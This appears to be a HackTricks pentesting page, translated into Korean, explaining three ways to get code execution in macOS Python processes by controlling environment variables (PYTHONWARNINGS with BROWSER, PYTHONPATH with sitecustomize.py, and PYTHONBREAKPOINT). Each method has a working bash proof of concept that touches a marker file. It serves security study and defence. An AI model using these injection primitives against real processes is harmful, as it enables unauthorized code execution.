# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` 및 `BROWSER` environment variables를 통한 방법

공격자가 Python process의 environment를 제어할 수 있다면, `PYTHONWARNINGS`와 `BROWSER`의 조합을 통해 Python이 crafted warning option을 처리하는 동안 `antigravity` module을 import할 때 command execution을 트리거할 수 있습니다. 이 technique은 `antigravity`가 Python의 `webbrowser` module을 사용해 URL을 열고, 이 module이 `BROWSER` environment variable을 따르는 방식에 기반합니다.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## `PYTHONPATH` 및 `sitecustomize.py`를 통한 방식

일반적인 startup 과정에서 Python의 `site` module은 site-specific paths를 추가한 다음 `sitecustomize`라는 이름의 module을 import하려고 시도합니다. `PYTHONPATH`의 앞부분에 attacker-readable directory를 배치하면, process environment를 제어하는 attacker가 target script보다 먼저 Python이 payload를 import하도록 만들 수 있습니다. `-S` flag는 자동 `site` initialization을 비활성화하며, isolated mode(`-I`)는 `PYTHONPATH`를 무시하고 `-s` 및 `-E`를 적용합니다.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## `PYTHONBREAKPOINT`를 통한

Python 3.7(PEP 553)부터 내장 `breakpoint()`는 `sys.breakpointhook`이 가리키는 대상을 import하고 호출하며, 해당 대상은 **`PYTHONBREAKPOINT`** 환경 변수(`package.module.callable`)에서 가져옵니다. 지정된 module을 import하고 callable을 호출하는 작업은 debugger가 일반적으로 나타나기 전에 모두 실행되므로, `breakpoint()`에 도달하는 프로세스의 환경을 attacker가 제어할 수 있다면 code execution을 얻을 수 있습니다(maintenance/debug script에서 흔히 발생하며, 때로는 production 경로에 남아 있기도 합니다).<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
`PYTHONWARNINGS`/`PYTHONPATH`와 달리, 이 방법은 대상이 실제로 `breakpoint()` 호출에 도달해야 하지만, 지정된 module의 **import side effects**만으로도 작동합니다(어떤 import 가능한 module이든 지정할 수 있습니다. 예를 들어 `PYTHONPATH`에서 가장 먼저 위치하며 최상위 수준에서 코드를 실행하는 module). `PYTHONBREAKPOINT=0`으로 설정하면 hook이 완전히 비활성화됩니다.

## References

- [1] [환경 변수를 사용한 Hacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site별 configuration hook](https://docs.python.org/3/library/site.html)
- [3] [Python command-line 및 environment](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — 기본 제공 breakpoint() 및 PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
